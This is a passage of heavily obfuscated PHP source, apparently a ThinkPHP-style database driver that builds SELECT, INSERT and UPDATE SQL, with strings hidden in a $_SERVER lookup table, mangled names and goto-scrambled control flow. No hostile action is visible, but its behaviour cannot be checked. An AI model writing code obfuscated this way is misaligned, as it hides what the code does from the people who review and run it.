$e¢½÷ñô½[803] => isset($CÎââô„³[$e¢½÷ñô½[803]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[803]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[803]][0], $e¢½÷ñô½[804] => isset($CÎââô„³[$e¢½÷ñô½[804]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[804]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[804]][0], $e¢½÷ñô½[17] => isset($CÎââô„³[$e¢½÷ñô½[17]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[17]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[17]][0], $e¢½÷ñô½[832] => isset($CÎââô„³[$e¢½÷ñô½[832]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[832]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[832]][0], $e¢½÷ñô½[13] => isset($CÎââô„³[$e¢½÷ñô½[13]][$C…ŒÜŒ›îª]) ? $CÎââô„³[$e¢½÷ñô½[13]][$C…ŒÜŒ›îª] : $CÎââô„³[$e¢½÷ñô½[13]][0]); return $this->connect($AšÛª··Šš, $C…ŒÜŒ›îª); } public function parseDSN($cà•²ÓéÁ¹) { $bâÏ±‘„‘– =& $_SERVER[Õİõş]; if (empty($cà•²ÓéÁ¹)) { return !1; } $eÌ¢íŠ½é = parse_url($cà•²ÓéÁ¹); if ($eÌ¢íŠ½é[$bâÏ±‘„‘–[164]]) { $dÅÛÀ«ï¾ = array($bâÏ±‘„‘–[880] => $eÌ¢íŠ½é[$bâÏ±‘„‘–[164]], $bâÏ±‘„‘–[805] => isset($eÌ¢íŠ½é[$bâÏ±‘„‘–[530]]) ? $eÌ¢íŠ½é[$bâÏ±‘„‘–[530]] : $bâÏ±‘„‘–[33], $bâÏ±‘„‘–[806] => isset($eÌ¢íŠ½é[$bâÏ±‘„‘–[901]]) ? $eÌ¢íŠ½é[$bâÏ±‘„‘–[901]] : $bâÏ±‘„‘–[33], $bâÏ±‘„‘–[803] => isset($eÌ¢íŠ½é[$bâÏ±‘„‘–[165]]) ? $eÌ¢íŠ½é[$bâÏ±‘„‘–[165]] : $bâÏ±‘„‘–[33], $bâÏ±‘„‘–[804] => isset($eÌ¢íŠ½é[$bâÏ±‘„‘–[166]]) ? $eÌ¢íŠ½é[$bâÏ±‘„‘–[166]] : $bâÏ±‘„‘–[33], $bâÏ±‘„‘–[17] => isset($eÌ¢íŠ½é[$bâÏ±‘„‘–[75]]) ? substr($eÌ¢íŠ½é[$bâÏ±‘„‘–[75]], 1) : $bâÏ±‘„‘–[33]); } else { preg_match($bâÏ±‘„‘–[902], trim($cà•²ÓéÁ¹), $aĞÀ ÖƒŞ); $dÅÛÀ«ï¾ = array($bâÏ±‘„‘–[880] => $aĞÀ ÖƒŞ[1], $bâÏ±‘„‘–[805] => $aĞÀ ÖƒŞ[2], $bâÏ±‘„‘–[806] => $aĞÀ ÖƒŞ[3], $bâÏ±‘„‘–[803] => $aĞÀ ÖƒŞ[4], $bâÏ±‘„‘–[804] => $aĞÀ ÖƒŞ[5], $bâÏ±‘„‘–[17] => $aĞÀ ÖƒŞ[6]); } $dÅÛÀ«ï¾[$bâÏ±‘„‘–[832]] = $bâÏ±‘„‘–[33]; return $dÅÛÀ«ï¾; } protected function debug() { $f×ã”•Ÿ«¨ =& $_SERVER[Õİõş]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $f×ã”•Ÿ«¨[903]; if (think_config($f×ã”•Ÿ«¨[904])) { think_status($f×ã”•Ÿ«¨[905]); think_trace($this->queryStr . $f×ã”•Ÿ«¨[906] . think_status($f×ã”•Ÿ«¨[20], $f×ã”•Ÿ«¨[905], 6) . $f×ã”•Ÿ«¨[907], $f×ã”•Ÿ«¨[33], $f×ã”•Ÿ«¨[908]); } } protected function parseLock($f§äíßÎ¥ = false) { $c‘¢Øë£×à =& $_SERVER[Õİõş]; if (!$f§äíßÎ¥) { return $c‘¢Øë£×à[33]; } if ($c‘¢Øë£×à[834] == $this->dbType) { return $c‘¢Øë£×à[909]; } return $c‘¢Øë£×à[910]; } protected function parseSet($d™õÌƒ„âØ) { $bù–ùè’µ =& $_SERVER[Õİõş]; foreach ($d™õÌƒ„âØ as $c²’Œ‹œÓ => $Fáê¡çƒ‰…) { if (is_array($Fáê¡çƒ‰…) && $bù–ùè’µ[281] == $Fáê¡çƒ‰…[0]) { $dğ–´¸ÒÑÀ[] = $this->parseKey($c²’Œ‹œÓ) . $bù–ùè’µ[911] . $Fáê¡çƒ‰…[1]; } elseif (is_scalar($Fáê¡çƒ‰…) || is_null($Fáê¡çƒ‰…)) { $dğ–´¸ÒÑÀ[] = $this->parseKey($c²’Œ‹œÓ) . $bù–ùè’µ[911] . $this->parseValue($Fáê¡çƒ‰…); } } return $bù–ùè’µ[912] . implode($bù–ùè’µ[47], $dğ–´¸ÒÑÀ); } protected function bindParam($fÎÆˆÆƒ—, $E…ÙŸŸ“•) { $this->bind[$_SERVER[Õİõş][4] . $fÎÆˆÆƒ—] = $E…ÙŸŸ“•; } protected function parseBind($AšŠ›à©õ) { $AšŠ›à©õ = array_merge($this->bind, $AšŠ›à©õ); $this->bind = array(); return $AšŠ›à©õ; } function parseKey(&$dòİ¾õ§•, $f¼óåÚ²Çç = true) { if ($f¼óåÚ²Çç) { $dòİ¾õ§• = $this->parseKeyCheck($dòİ¾õ§•); } return $dòİ¾õ§•; } function parseKeyCheck($Fë®ÂµÙ) { $aË §¦‡ŠÃ =& $_SERVER[Õİõş]; $Fë®ÂµÙ = trim($Fë®ÂµÙ); if (!preg_match($aË §¦‡ŠÃ[913], $Fë®ÂµÙ)) { think_exception($aË §¦‡ŠÃ[914] . $Fë®ÂµÙ); } return $Fë®ÂµÙ; } protected function parseValue($Fë©ÓÔÄ·Ñ) { $DÕœÕæÌÁ =& $_SERVER[Õİõş]; if (is_string($Fë©ÓÔÄ·Ñ)) { $Fë©ÓÔÄ·Ñ = $DÕœÕæÌÁ[873] . $this->escapeString($Fë©ÓÔÄ·Ñ) . $DÕœÕæÌÁ[873]; } elseif (isset($Fë©ÓÔÄ·Ñ[0]) && is_string($Fë©ÓÔÄ·Ñ[0]) && strtolower($Fë©ÓÔÄ·Ñ[0]) == $DÕœÕæÌÁ[281]) { $Fë©ÓÔÄ·Ñ = $this->escapeString($Fë©ÓÔÄ·Ñ[1]); } elseif (is_array($Fë©ÓÔÄ·Ñ)) { $Fë©ÓÔÄ·Ñ = array_map(array($this, $DÕœÕæÌÁ[874]), $Fë©ÓÔÄ·Ñ); } elseif (is_bool($Fë©ÓÔÄ·Ñ)) { $Fë©ÓÔÄ·Ñ = $Fë©ÓÔÄ·Ñ ? $DÕœÕæÌÁ[83] : $DÕœÕæÌÁ[463]; } elseif (is_null($Fë©ÓÔÄ·Ñ)) { $Fë©ÓÔÄ·Ñ = $DÕœÕæÌÁ[99]; } return $Fë©ÓÔÄ·Ñ; } protected function parseField($Aµ©®ğÀ §) { $D¨…”Ô„‘ß =& $_SERVER[Õİõş]; if (is_string($Aµ©®ğÀ §) && strpos($Aµ©®ğÀ §, $D¨…”Ô„‘ß[47])) { $Aµ©®ğÀ § = explode($D¨…”Ô„‘ß[47], $Aµ©®ğÀ §); } if (is_array($Aµ©®ğÀ §)) { $bë¦ä‡‹·Ê = array(); foreach ($Aµ©®ğÀ § as $A ­¾Áùˆæ => $e¤âÅ™æ) { if (!is_numeric($A ­¾Áùˆæ)) { $bë¦ä‡‹·Ê[] = $this->parseKey($A ­¾Áùˆæ) . $D¨…”Ô„‘ß[915] . $this->parseKey($e¤âÅ™æ); } else { $bë¦ä‡‹·Ê[] = $this->parseKey($e¤âÅ™æ); } } $A’®³Èš„Å = implode($D¨…”Ô„‘ß[47], $bë¦ä‡‹·Ê); } elseif (is_string($Aµ©®ğÀ §) && !empty($Aµ©®ğÀ §)) { $A’®³Èš„Å = $Aµ©®ğÀ §; } else { $A’®³Èš„Å = $D¨…”Ô„‘ß[172]; } return $A’®³Èš„Å; } protected function parseTable($fèØ‚ÏÅ¶á) { $BÑ„óî•ÆÁ =& $_SERVER[Õİõş]; if (is_array($fèØ‚ÏÅ¶á)) { $F†Ûø˜ñ = array(); foreach ($fèØ‚ÏÅ¶á as $dìàñ‘––µ => $aÉ‹µ­ÓæÜ) { if (!is_numeric($dìàñ‘––µ)) { $F†Ûø˜ñ[] = $this->parseKey($dìàñ‘––µ) . $BÑ„óî•ÆÁ[50] . $this->parseKey($aÉ‹µ­ÓæÜ); } else { $F†Ûø˜ñ[] = $this->parseKey($dìàñ‘––µ); } } $fèØ‚ÏÅ¶á = $F†Ûø˜ñ; } elseif (is_string($fèØ‚ÏÅ¶á)) { if (strstr($fèØ‚ÏÅ¶á, $BÑ„óî•ÆÁ[50])) { return $fèØ‚ÏÅ¶á; } $fèØ‚ÏÅ¶á = explode($BÑ„óî•ÆÁ[47], $fèØ‚ÏÅ¶á); array_walk($fèØ‚ÏÅ¶á, array($this, $BÑ„óî•ÆÁ[822])); } return $BÑ„óî•ÆÁ[916] . trim(implode($BÑ„óî•ÆÁ[917], $fèØ‚ÏÅ¶á), $BÑ„óî•ÆÁ[828]) . $BÑ„óî•ÆÁ[916]; } protected function parseWhere($EÍò¾ğ‚—ˆ) { $Fåó‡µäÛ =& $_SERVER[Õİõş]; $AÊïŒ†‡‰ = $Fåó‡µäÛ[33]; if (is_string($EÍò¾ğ‚—ˆ)) { $AÊïŒ†‡‰ = $EÍò¾ğ‚—ˆ; } else { $EëÇ³äò¥ = isset($EÍò¾ğ‚—ˆ[$Fåó‡µäÛ[918]]) ? strtoupper($EÍò¾ğ‚—ˆ[$Fåó‡µäÛ[918]]) : $Fåó‡µäÛ[33]; if (in_array($EëÇ³äò¥, array($Fåó‡µäÛ[919], $Fåó‡µäÛ[920], $Fåó‡µäÛ[921]))) { $EëÇ³äò¥ = $Fåó‡µäÛ[50] . $EëÇ³äò¥ . $Fåó‡µäÛ[50]; unset($EÍò¾ğ‚—ˆ[$Fåó‡µäÛ[918]]); } else { $EëÇ³äò¥ = $Fåó‡µäÛ[922]; } foreach ($EÍò¾ğ‚—ˆ as $Aè•™ªË¢ => $C£—¨å¤Ì ) { $AÊïŒ†‡‰ .= $Fåó‡µäÛ[261]; if (is_numeric($Aè•™ªË¢)) { $Aè•™ªË¢ = $Fåó‡µäÛ[923]; } if (0 === strpos($Aè•™ªË¢, $Fåó‡µäÛ[70])) { $AÊïŒ†‡‰ .= $this->parseThinkWhere($Aè•™ªË¢, $C£—¨å¤Ì ); } else { if (!preg_match($Fåó‡µäÛ[924], trim($Aè•™ªË¢))) { think_exception(think_lang($Fåó‡µäÛ[925]) . $Fåó‡µäÛ[4] . $Aè•™ªË¢); } $F…ª™Î²Š† = is_array($C£—¨å¤Ì ) && isset($C£—¨å¤Ì [$Fåó‡µäÛ[926]]); $Aè•™ªË¢ = trim($Aè•™ªË¢); if (strpos($Aè•™ªË¢, $Fåó‡µäÛ[267])) { $EÓˆ­÷Œ‚ø = explode($Fåó‡µäÛ[267], $Aè•™ªË¢); $Eİóƒ¨½Ù = array(); foreach ($EÓˆ­÷Œ‚ø as $dä…ÍÕÏ¯® => $Aá’Æ¤‡ßÂ) { $bÎšå‘£Œß = $F…ª™Î²Š† ? $C£—¨å¤Ì [$dä…ÍÕÏ¯®] : $C£—¨å¤Ì ; $Eİóƒ¨½Ù[] = $Fåó‡µäÛ[244] . $this->parseWhereItem($this->parseKey($Aá’Æ¤‡ßÂ), $bÎšå‘£Œß) . $Fåó‡µäÛ[821]; } $AÊïŒ†‡‰ .= implode($Fåó‡µäÛ[927], $Eİóƒ¨½Ù); } elseif (strpos($Aè•™ªË¢, $Fåó‡µäÛ[268])) { $EÓˆ­÷Œ‚ø = explode($Fåó‡µäÛ[268], $Aè•™ªË¢); $Eİóƒ¨½Ù = array(); foreach ($EÓˆ­÷Œ‚ø as $dä…ÍÕÏ¯® => $Aá’Æ¤‡ßÂ) { $bÎšå‘£Œß = $F…ª™Î²Š† ? $C£—¨å¤Ì [$dä…ÍÕÏ¯®] : $C£—¨å¤Ì ; $Eİóƒ¨½Ù[] = $Fåó‡µäÛ[244] . $this->parseWhereItem($this->parseKey($Aá’Æ¤‡ßÂ), $bÎšå‘£Œß) . $Fåó‡µäÛ[821]; } $AÊïŒ†‡‰ .= implode($Fåó‡µäÛ[922], $Eİóƒ¨½Ù); } else { $AÊïŒ†‡‰ .= $this->parseWhereItem($this->parseKey($Aè•™ªË¢), $C£—¨å¤Ì ); } } $AÊïŒ†‡‰ .= $Fåó‡µäÛ[262] . $EëÇ³äò¥; } $AÊïŒ†‡‰ = substr($AÊïŒ†‡‰, 0, -strlen($EëÇ³äò¥)); } return empty($AÊïŒ†‡‰) ? $Fåó‡µäÛ[33] : $Fåó‡µäÛ[928] . $AÊïŒ†‡‰; } protected function parseWhereItem($bÉÃòİ©, $f›»”ğÅÁ) { $F‡¶„Í¬ =& $_SERVER[Õİõş]; $A¿¼™Š„…Ó = $F‡¶„Í¬[33]; if (is_array($f›»”ğÅÁ)) { if (is_string($f›»”ğÅÁ[0])) { $aô‹†ìÎ‚Š = strtolower($f›»”ğÅÁ[0]); if (in_array($f›»”ğÅÁ[0], array($F‡¶„Í¬[911], $F‡¶„Í¬[929], $F‡¶„Í¬[930], $F‡¶„Í¬[931], $F‡¶„Í¬[932], $F‡¶„Í¬[933]))) { $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[50] . $f›»”ğÅÁ[0] . $F‡¶„Í¬[50] . $this->parseValue($f›»”ğÅÁ[1]); } elseif (preg_match($F‡¶„Í¬[934], $f›»”ğÅÁ[0])) { $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[50] . $this->parseValue($f›»”ğÅÁ[1]); } elseif (preg_match($F‡¶„Í¬[935], $f›»”ğÅÁ[0])) { if (is_array($f›»”ğÅÁ[1])) { $B±–ÓÛŠ‰ = isset($f›»”ğÅÁ[2]) ? strtoupper($f›»”ğÅÁ[2]) : $F‡¶„Í¬[920]; if (in_array($B±–ÓÛŠ‰, array($F‡¶„Í¬[919], $F‡¶„Í¬[920], $F‡¶„Í¬[921]))) { $aßÆÚœ¹ = array(); foreach ($f›»”ğÅÁ[1] as $c‘ö†ö´”) { $aßÆÚœ¹[] = $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[50] . $this->parseValue($c‘ö†ö´”); } $A¿¼™Š„…Ó .= $F‡¶„Í¬[244] . implode($F‡¶„Í¬[50] . $B±–ÓÛŠ‰ . $F‡¶„Í¬[50], $aßÆÚœ¹) . $F‡¶„Í¬[821]; } } else { $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[50] . $this->parseValue($f›»”ğÅÁ[1]); } } elseif ($F‡¶„Í¬[281] == $aô‹†ìÎ‚Š) { $A¿¼™Š„…Ó .= $F‡¶„Í¬[819] . $bÉÃòİ© . $F‡¶„Í¬[50] . $f›»”ğÅÁ[1] . $F‡¶„Í¬[936]; } elseif (preg_match($F‡¶„Í¬[937], $f›»”ğÅÁ[0])) { if (isset($f›»”ğÅÁ[2]) && $F‡¶„Í¬[281] == $f›»”ğÅÁ[2]) { $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[50] . $f›»”ğÅÁ[1]; } else { if (is_string($f›»”ğÅÁ[1])) { $f›»”ğÅÁ[1] = explode($F‡¶„Í¬[47], $f›»”ğÅÁ[1]); } $cÀ§ŒéŸÅÄ = implode($F‡¶„Í¬[47], $this->parseValue($f›»”ğÅÁ[1])); $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[819] . $cÀ§ŒéŸÅÄ . $F‡¶„Í¬[821]; } } elseif (preg_match($F‡¶„Í¬[938], $f›»”ğÅÁ[0])) { $E…‚ïø Û™ = is_string($f›»”ğÅÁ[1]) ? explode($F‡¶„Í¬[47], $f›»”ğÅÁ[1]) : $f›»”ğÅÁ[1]; $A¿¼™Š„…Ó .= $F‡¶„Í¬[819] . $bÉÃòİ© . $F‡¶„Í¬[50] . $this->exp[$aô‹†ìÎ‚Š] . $F‡¶„Í¬[50] . $this->parseValue($E…‚ïø Û™[0]) . $F‡¶„Í¬[922] . $this->parseValue($E…‚ïø Û™[1]) . $F‡¶„Í¬[262]; } else { think_exception(think_lang($F‡¶„Í¬[925]) . $F‡¶„Í¬[4] . $f›»”ğÅÁ[0]); } } else { $eÙøœÒÁõ” = count($f›»”ğÅÁ); $dÁÒÂ¨æÍ” = isset($f›»”ğÅÁ[$eÙøœÒÁõ” - 1]) ? strtoupper($f›»”ğÅÁ[$eÙøœÒÁõ” - 1]) : $F‡¶„Í¬[33]; if (in_array($dÁÒÂ¨æÍ”, array($F‡¶„Í¬[919], $F‡¶„Í¬[920], $F‡¶„Í¬[921]))) { $eÙøœÒÁõ” = $eÙøœÒÁõ” - 1; } else { $dÁÒÂ¨æÍ” = $F‡¶„Í¬[919]; } for ($d˜îŒä‡· = 0; $d˜îŒä‡· < $eÙøœÒÁõ”; $d˜îŒä‡·++) { $E…‚ïø Û™ = is_array($f›»”ğÅÁ[$d˜îŒä‡·]) ? $f›»”ğÅÁ[$d˜îŒä‡·][1] : $f›»”ğÅÁ[$d˜îŒä‡·]; if ($F‡¶„Í¬[281] == strtolower($f›»”ğÅÁ[$d˜îŒä‡·][0])) { $A¿¼™Š„…Ó .= $F‡¶„Í¬[244] . $bÉÃòİ© . $F‡¶„Í¬[50] . $E…‚ïø Û™ . $F‡¶„Í¬[936] . $dÁÒÂ¨æÍ” . $F‡¶„Í¬[50]; } else { $cİ‘ùÃ¡ô = is_array($f›»”ğÅÁ[$d˜îŒä‡·]) ? $this->exp[strtolower($f›»”ğÅÁ[$d˜îŒä‡·][0])] : $F‡¶„Í¬[911]; if (!$cİ‘ùÃ¡ô && is_array($f›»”ğÅÁ[$d˜îŒä‡·]) && in_array($f›»”ğÅÁ[$d˜îŒä‡·][0], array($F‡¶„Í¬[911], $F‡¶„Í¬[929], $F‡¶„Í¬[930], $F‡¶„Í¬[931], $F‡¶„Í¬[932], $F‡¶„Í¬[933]))) { $cİ‘ùÃ¡ô = $f›»”ğÅÁ[$d˜îŒä‡·][0]; } $A¿¼™Š„…Ó .= $F‡¶„Í¬[244] . $bÉÃòİ© . $F‡¶„Í¬[50] . $cİ‘ùÃ¡ô . $F‡¶„Í¬[50] . $this->parseValue($E…‚ïø Û™) . $F‡¶„Í¬[936] . $dÁÒÂ¨æÍ” . $F‡¶„Í¬[50]; } } $A¿¼™Š„…Ó = substr($A¿¼™Š„…Ó, 0, -4); } } else { $A¿¼™Š„…Ó .= $bÉÃòİ© . $F‡¶„Í¬[939] . $this->parseValue($f›»”ğÅÁ); } return $A¿¼™Š„…Ó; } protected function parseThinkWhere($aÒµ‡ø‡à’, $EùíÃÍ‚Ñ) { $Aµóà£©± =& $_SERVER[Õİõş]; $eÉ«Óïö°” = $Aµóà£©±[33]; switch ($aÒµ‡ø‡à’) { case $Aµóà£©±[335]: $eÉ«Óïö°” = $EùíÃÍ‚Ñ; break; case $Aµóà£©±[923]: $eÉ«Óïö°” = is_string($EùíÃÍ‚Ñ) ? $EùíÃÍ‚Ñ : substr($this->parseWhere($EùíÃÍ‚Ñ), 6); break; case $Aµóà£©±[940]: parse_str($EùíÃÍ‚Ñ, $eà “µÂôï); if (isset($eà “µÂôï[$Aµóà£©±[918]])) { $Fó‹±Ä³™ = $Aµóà£©±[50] . strtoupper($eà “µÂôï[$Aµóà£©±[918]]) . $Aµóà£©±[50]; unset($eà “µÂôï[$Aµóà£©±[918]]); } else { $Fó‹±Ä³™ = $Aµóà£©±[922]; } $B˜‘›¨²õ‹ = array(); foreach ($eà “µÂôï as $A»¤¬œŸ… => $DàÏøñ¯§½) { $B˜‘›¨²õ‹[] = $this->parseKey($A»¤¬œŸ…) . $Aµóà£©±[939] . $this->parseValue($DàÏøñ¯§½); } $eÉ«Óïö°” = implode($Fó‹±Ä³™, $B˜‘›¨²õ‹); break; } return $eÉ«Óïö°”; } protected function parseLimit($AöòÔïì…ò) { $f‚Êã÷ê´ =& $_SERVER[Õİõş]; return !empty($AöòÔïì…ò) ? $f‚Êã÷ê´[48] . $AöòÔïì…ò . $f‚Êã÷ê´[50] : $f‚Êã÷ê´[33]; } protected function parseJoin($dáò¨’æ²½) { $DàªÎÃ‘ˆ‡ =& $_SERVER[Õİõş]; $c±Ä·±¹ÒÀ = $DàªÎÃ‘ˆ‡[33]; if (!empty($dáò¨’æ²½)) { if (is_array($dáò¨’æ²½)) { foreach ($dáò¨’æ²½ as $AÕÕé¿ÏÓÇ => $a¹Áœ„Á—İ) { if (!1 !== stripos($a¹Áœ„Á—İ, $DàªÎÃ‘ˆ‡[941])) { $c±Ä·±¹ÒÀ .= $DàªÎÃ‘ˆ‡[50] . $a¹Áœ„Á—İ; } else { $c±Ä·±¹ÒÀ .= $DàªÎÃ‘ˆ‡[942] . $a¹Áœ„Á—İ; } } } else { $c±Ä·±¹ÒÀ .= $DàªÎÃ‘ˆ‡[942] . $dáò¨’æ²½; } } $c±Ä·±¹ÒÀ = preg_replace($DàªÎÃ‘ˆ‡[943], think_config($DàªÎÃ‘ˆ‡[846]) . $DàªÎÃ‘ˆ‡[944], $c±Ä·±¹ÒÀ); return $c±Ä·±¹ÒÀ; } protected function parseOrder($CéÛ½°¨Ğ¾) { $D‚æá¹–˜ =& $_SERVER[Õİõş]; if (is_array($CéÛ½°¨Ğ¾)) { $a•§‹…Ùã = array(); foreach ($CéÛ½°¨Ğ¾ as $f½³Šœç…Ú => $Eè ¼Ù›çÕ) { if (is_numeric($f½³Šœç…Ú)) { $a•§‹…Ùã[] = $this->parseKey($Eè ¼Ù›çÕ); } else { $Eè ¼Ù›çÕ = in_array(strtoupper(trim($Eè ¼Ù›çÕ)), array($D‚æá¹–˜[945], $D‚æá¹–˜[946])) ? $D‚æá¹–˜[50] . $Eè ¼Ù›çÕ : $D‚æá¹–˜[33]; if (preg_match($D‚æá¹–˜[947], $f½³Šœç…Ú)) { $a•§‹…Ùã[] = $this->parseKey($f½³Šœç…Ú) . $Eè ¼Ù›çÕ; } else { think_exception($D‚æá¹–˜[948] . $f½³Šœç…Ú); } } } $CéÛ½°¨Ğ¾ = implode($D‚æá¹–˜[47], $a•§‹…Ùã); } return !empty($CéÛ½°¨Ğ¾) ? $D‚æá¹–˜[949] . $CéÛ½°¨Ğ¾ : $D‚æá¹–˜[33]; } protected function parseGroup($AŠÏš‰ùŒ‰) { $E¦’‰Ë‹ =& $_SERVER[Õİõş]; return !empty($AŠÏš‰ùŒ‰) ? $E¦’‰Ë‹[950] . $AŠÏš‰ùŒ‰ : $E¦’‰Ë‹[33]; } protected function parseHaving($D¨¨ÑùîÖ´) { $eˆšÌ“±Ö´ =& $_SERVER[Õİõş]; return !empty($D¨¨ÑùîÖ´) ? $eˆšÌ“±Ö´[951] . $D¨¨ÑùîÖ´ : $eˆšÌ“±Ö´[33]; } protected function parseComment($D´Å™œçÔ) { $FªÍåŸÖ‚Ã =& $_SERVER[Õİõş]; return !empty($D´Å™œçÔ) ? $FªÍåŸÖ‚Ã[952] . $D´Å™œçÔ . $FªÍåŸÖ‚Ã[953] : $FªÍåŸÖ‚Ã[33]; } protected function parseDistinct($EÆ¶äÖ·³£) { $bÃÚ°•ÉÄ =& $_SERVER[Õİõş]; return !empty($EÆ¶äÖ·³£) ? $bÃÚ°•ÉÄ[954] : $bÃÚ°•ÉÄ[33]; } protected function parseUnion($Aì‹¡ºÊÜÄ) { $DæŒœë¾™’ =& $_SERVER[Õİõş]; if (empty($Aì‹¡ºÊÜÄ)) { return $DæŒœë¾™’[33]; } if (isset($Aì‹¡ºÊÜÄ[$DæŒœë¾™’[332]])) { $d—âˆ‚îö“ = $DæŒœë¾™’[955]; unset($Aì‹¡ºÊÜÄ[$DæŒœë¾™’[332]]); } else { $d—âˆ‚îö“ = $DæŒœë¾™’[956]; } foreach ($Aì‹¡ºÊÜÄ as $DÀ“‘ÓÇ…) { $D×•ËñÀÕø[] = $d—âˆ‚îö“ . (is_array($DÀ“‘ÓÇ…) ? $this->buildSelectSql($DÀ“‘ÓÇ…) : $DÀ“‘ÓÇ…); } return implode($DæŒœë¾™’[50], $D×•ËñÀÕø); } public function insert($e¸êÙé±Ş¡, $b¥ÑÙå·ğŠ = array(), $b°‹•Ÿ¦Èö = false) { goto Dİ¤š©‰§ß; e„Î×Àó·Ü: $AËö£«„¹’ .= $this->parseComment(!empty($b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[337]]) ? $b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[337]] : $dŞ£¢ê¬ Ÿ[33]); return $this->execute($AËö£«„¹’, $this->parseBind(!empty($b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[269]]) ? $b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[269]] : array())); goto FÚÄĞ£º“Ğ; cİ±Öˆ£¦À: foreach ($e¸êÙé±Ş¡ as $D¦—Ÿß¾ÏÃ => $c´¶ëõÄ…ó) { if (is_array($c´¶ëõÄ…ó) && $dŞ£¢ê¬ Ÿ[281] == $c´¶ëõÄ…ó[0]) { $AÃÚ¢™¾[] = $this->parseKey($D¦—Ÿß¾ÏÃ); $c—ÈòáŒ¬»[] = $c´¶ëõÄ…ó[1]; } elseif (is_scalar($c´¶ëõÄ…ó) || is_null($c´¶ëõÄ…ó)) { $AÃÚ¢™¾[] = $this->parseKey($D¦—Ÿß¾ÏÃ); $c—ÈòáŒ¬»[] = $this->parseValue($c´¶ëõÄ…ó); } } $AËö£«„¹’ = ($b°‹•Ÿ¦Èö ? $dŞ£¢ê¬ Ÿ[823] : $dŞ£¢ê¬ Ÿ[824]) . $dŞ£¢ê¬ Ÿ[825] . $this->parseTable($b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[263]]) . $dŞ£¢ê¬ Ÿ[819] . implode($dŞ£¢ê¬ Ÿ[47], $AÃÚ¢™¾) . $dŞ£¢ê¬ Ÿ[820] . implode($dŞ£¢ê¬ Ÿ[47], $c—ÈòáŒ¬») . $dŞ£¢ê¬ Ÿ[821]; $AËö£«„¹’ .= $this->parseLock(isset($b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[780]]) ? $b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[780]] : !1); goto e„Î×Àó·Ü; Dİ¤š©‰§ß: $dŞ£¢ê¬ Ÿ =& $_SERVER[Õİõş]; $c—ÈòáŒ¬» = $AÃÚ¢™¾ = array(); $this->model = $b¥ÑÙå·ğŠ[$dŞ£¢ê¬ Ÿ[265]]; goto cİ±Öˆ£¦À; FÚÄĞ£º“Ğ: } public function selectInsert($bÄî¯¾¨¼é, $B¬¥Ô¯°Â‡, $e²µ‡§Ù± = array()) { goto A‹«ÊÀ¶‚; Cƒ„Ò±¤£³: return $this->execute($cŞåßºó³, $this->parseBind(!empty($e²µ‡§Ù±[$D¸¾Òˆ•¼Á[269]]) ? $e²µ‡§Ù±[$D¸¾Òˆ•¼Á[269]] : array())); goto C¬ßªÎäå†; D˜ëŸ÷¼·î: array_walk($bÄî¯¾¨¼é, array($this, $D¸¾Òˆ•¼Á[822])); $cŞåßºó³ = $D¸¾Òˆ•¼Á[957] . $this->parseTable($B¬¥Ô¯°Â‡) . $D¸¾Òˆ•¼Á[819] . implode($D¸¾Òˆ•¼Á[47], $bÄî¯¾¨¼é) . $D¸¾Òˆ•¼Á[936]; $cŞåßºó³ .= $this->buildSelectSql($e²µ‡§Ù±); goto Cƒ„Ò±¤£³; A‹«ÊÀ¶‚: $D¸¾Òˆ•¼Á =& $_SERVER[Õİõş]; $this->model = $e²µ‡§Ù±[$D¸¾Òˆ•¼Á[265]]; if (is_string($bÄî¯¾¨¼é)) { $bÄî¯¾¨¼é = explode($D¸¾Òˆ•¼Á[47], $bÄî¯¾¨¼é); } goto D˜ëŸ÷¼·î; C¬ßªÎäå†: } public function update($eæõÕáƒ¡š, $cãËó‡Ç) { $aÉ“¤¶ä¶ =& $_SERVER[Õİõş]; $this->model = $cãËó‡Ç[$aÉ“¤¶ä¶[265]]; $cÇ„†­ø´Õ = $aÉ“¤¶ä¶[958] . $this->parseTable($cãËó‡Ç[$aÉ“¤¶ä¶[263]]) . $this->parseSet($eæõÕáƒ¡š) . $this->parseWhere(!empty($cãËó‡Ç[$aÉ“¤¶ä¶[259]]) ? $cãËó‡Ç[$aÉ“¤¶ä¶[259]] : $aÉ“¤¶ä¶[33]) . $this->parseOrder(!empty($cãËó‡Ç[$aÉ“¤¶ä¶[346]]) ? $cãËó‡Ç[$aÉ“¤¶ä¶[346]] : $aÉ“¤¶ä¶[33]) . $this->parseLimit(!empty($cãËó‡Ç[$aÉ“¤¶ä¶[276]]) ? $cãËó‡Ç[$aÉ“¤¶ä¶[276]] : $aÉ“¤¶ä¶[33]) . $this->parseLock(isset($cãËó‡Ç[$aÉ“¤¶ä¶[780]]) ? $cãËó‡Ç[$aÉ“¤¶ä¶[780]] : !1) . $this->parseComment(!empty($cãËó‡Ç[$aÉ“¤¶ä¶[337]]) ? 